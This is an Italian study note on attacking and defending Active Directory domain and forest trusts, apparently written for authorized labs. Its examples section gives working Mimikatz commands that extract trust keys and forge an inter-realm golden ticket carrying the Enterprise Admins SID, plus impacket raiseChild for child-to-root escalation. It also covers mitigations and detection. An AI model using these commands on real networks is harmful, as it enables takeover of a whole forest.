---
tipo: concetto
tag: [windows, active-directory]
fase: 3
fonti: 4
aggiornato: 2026-06-28
stato: maturo
aliases: ["Trust di Dominio e Foresta"]
---

# Trust di Dominio e Foresta

> **Nota etica**: tecniche da usare solo in lab autorizzati (TryHackMe, HTB, GOAD) o engagement con permesso scritto.

## In breve
Un **trust** è una relazione che permette agli utenti di un dominio/[[Active Directory]] di autenticarsi e accedere a risorse di un altro dominio. Dentro una **foresta** i trust tra domini sono **transitivi e bidirezionali** di default; tra foreste diverse esistono **forest trust** (transitivi) ed **external trust** (non transitivi). Per un attaccante i trust sono **autostrade laterali**: dopo aver compromesso un dominio si possono **pivotare** verso domini "fidati" o, in certi casi, scalare dal dominio figlio al **root della foresta**. Il concetto chiave da capire è la differenza tra il **confine di sicurezza reale** (la **foresta**, non il dominio) e l'errore comune di trattare il dominio come boundary.

## Come funziona
Ogni trust ha una **trust key** condivisa (un account `TDO` — Trusted Domain Object — in `CN=System`, con attributo `trustAttributes`, `trustDirection`, `trustType`). Quando un utente accede a una risorsa cross-domain, [[Kerberos]] emette un **inter-realm TGT** (referral ticket) cifrato con la **trust key**: il KDC del dominio sorgente firma un ticket che il KDC del dominio target accetta.

Punti di abuso:
- **Intra-forest (figlio → root)**: i domini di una stessa foresta condividono lo schema e il **SID History** può attraversare il trust. Conoscendo la **trust key** (o l'hash di `krbtgt` del figlio) si forgia un **inter-realm TGT** con un **SID privilegiato della foresta** (es. il gruppo *Enterprise Admins*, RID 519, del dominio root) iniettato nel campo **SID History** → escalation a tutta la foresta. Questo perché **SIDHistory non viene filtrato intra-forest**.
- **Inter-forest**: di default scatta il **SID Filtering**, che rimuove dai ticket i SID estranei al dominio fidato, neutralizzando il trucco del SID History. Se però il filtering è **disabilitato/quarantine off**, oppure il trust è configurato con `TREAT_AS_EXTERNAL`, il SID History può ancora passare e si può scalare cross-forest.
- Si usa la **trust key** per forgiare ticket: la si estrae con [[DCSync]] / [[Mimikatz]] (`lsadump::trust`).

```
Compromesso DOM-FIGLIO  --DCSync--> trust key / krbtgt
   forgio inter-realm TGT con SIDHistory = S-1-5-21-<root>-519 (Enterprise Admins)
   --> accesso come EA su DOM-ROOT  (intra-forest, niente SID filtering)
```

## Esempi
**Enumerazione** dei trust:
```bash
# Da Linux (impacket / ldap)
impacket-getST -h    # (per i ticket dopo); enum trust via ldapsearch:
bloodyAD --host 10.10.10.1 -d figlio.dominio.local -u user -p pass \
  get search --filter '(objectClass=trustedDomain)' \
  --attr name,trustDirection,trustAttributes,trustPartner
```
```
# Da Windows (PowerView)
Get-DomainTrust
Get-DomainTrust -Domain figlio.dominio.local
nltest /domain_trusts /all_trusts
```
**Estrarre la trust key** (richiede DA sul dominio compromesso):
```
mimikatz # lsadump::trust /patch
mimikatz # lsadump::dcsync /domain:figlio.dominio.local /user:figlio$
```
**Forgiare l'inter-realm TGT con SID History** (intra-forest → Enterprise Admins) con [[Mimikatz]]:
```
kerberos::golden /user:Administrator /domain:figlio.dominio.local ^
  /sid:S-1-5-21-<SID-figlio> /sids:S-1-5-21-<SID-root>-519 ^
  /krbtgt:<hash-krbtgt-figlio> /service:krbtgt /target:root.dominio.local /ticket:trust.kirbi
```
Con [[Impacket]] (`raiseChild` automatizza child→parent):
```bash
# Escalation automatica dal dominio figlio al root della foresta
impacket-raiseChild figlio.dominio.local/Administrator:'Password!'
```
Poi si usa il ticket forgiato (`-k -no-pass`, `KRB5CCNAME`) per [[DCSync]] sul dominio root.

## Mitigazione e difesa
- **Trattare la foresta — non il dominio — come security boundary**: un dominio figlio compromesso = foresta a rischio. Separare gli asset critici in **foreste distinte** se serve isolamento reale.
- **SID Filtering / Quarantine** abilitato sui trust, specie inter-forest e dove non serve SID History (`netdom trust ... /quarantine:yes` o `/EnableSIDHistory:no`).
- **Selective Authentication** sui forest/external trust: gli utenti esterni devono ricevere esplicitamente *Allowed to authenticate* sulle risorse.
- Rimuovere trust **non necessari**; preferire trust **one-way** e non transitivi quando possibile.
- Proteggere `krbtgt` e le **trust key** (rotazione, monitoraggio); rilevare ticket con **SID History anomalo**.

## Lab
- **GOAD - Game of Active Directory**: ambiente multi-dominio/multi-foresta con trust pronti per child→parent e cross-forest.
- [[HackTheBox]] — *ProLabs* (es. **Dante**/**Cybernetics** AD multi-dominio) e box con trust.
- [[TryHackMe]] — room *Exploiting AD* con sezioni sui domain trust.

## Domande
1. **Qual è il vero security boundary in AD?** La **foresta**, non il dominio: i trust intra-forest non filtrano i SID privilegiati.
2. **Perché il trucco del SID History funziona intra-forest ma spesso no cross-forest?** Perché il **SID Filtering** è disattivo dentro la foresta e attivo (di default) tra foreste.
3. **Cosa serve per forgiare un inter-realm TGT?** La **trust key** (o l'hash `krbtgt` del dominio sorgente), ottenibile con DCSync/Mimikatz.
4. **Cosa fa `raiseChild` di Impacket?** Automatizza l'escalation child→parent: estrae l'hash, forgia il golden ticket inter-realm con SID degli Enterprise Admins e fa DCSync sul root.
5. **Come mitigo i rischi del trust cross-forest?** SID Filtering/Quarantine + Selective Authentication + trust minimali.

## Approfondimento livello esperto
**Trust key vs krbtgt**: per il cross-domain si può usare sia la **inter-realm trust key** (firma i referral TGT) sia l'**hash krbtgt** del dominio sorgente (golden ticket "esteso" con `/sids`). La trust key cambia con la rotazione del trust password (~30 giorni di default), l'hash krbtgt no finché non si ruota.

**SID Filtering — dettagli**: `trustAttributes` definisce il comportamento. `TREAT_AS_EXTERNAL` (0x40) applica filtering anche a trust intra-forest "esterni"; `WITHIN_FOREST` (0x20) lo disattiva. *Foreign Security Principals* e il claim `ExtraSids` del PAC sono i veicoli del SID History.

**Detection (Event ID)**:
- **4768/4769** — richieste TGT/TGS cross-realm: cercare ticket con **realm sorgente diverso** e SID privilegiati inattesi; un TGS per `krbtgt/ROOT` da un'identità del figlio è sospetto.
- **4624 logon cross-domain** con account che non dovrebbero attraversare il trust.
- **4662 / 4624** + DCSync sul root subito dopo un logon cross-domain → catena raiseChild.
- Monitorare creazione/modifica **TDO** (Event **5136/4706/4707**, *Trusted Domain* add/remove).

**ATT&CK**: T1482 (Domain Trust Discovery), T1134.005 (SID-History Injection), T1558 (Forge Kerberos Tickets). La persistenza basata su certificati (vedi [[ADCS e Template Vulnerabili (ESC1-ESC8)]]) può attraversare i confini se la PKI è condivisa nella foresta — **T1649**.

## Collegamenti
- [[Active Directory]] — struttura domini/foreste e TDO
- [[Kerberos]] — inter-realm TGT e SID History nel PAC
- [[DCSync]] — estrae trust key / krbtgt per forgiare i ticket
- [[Mimikatz]] · [[Impacket]] · [[bloodyAD]] — forging ed enumerazione
- [[BloodHound]] — mappa i trust e i path cross-domain
- [[Pass-the-Hash]] — uso degli hash estratti dopo l'escalation
- [[ADCS e Template Vulnerabili (ESC1-ESC8)]] · [[Delegation Kerberos (Unconstrained, Constrained, RBCD)]] · [[Shadow Credentials]]

## Fonti
- harmj0y — *A Guide to Attacking Domain Trusts*: https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/
- The Hacker Recipes — Domain & Forest Trusts: https://www.thehacker.recipes/ad/movement/trusts
- HackTricks — Domain Trusts / SID-History: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/sid-history-injection
- Microsoft — How Domain and Forest Trusts Work: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc773178(v=ws.10)
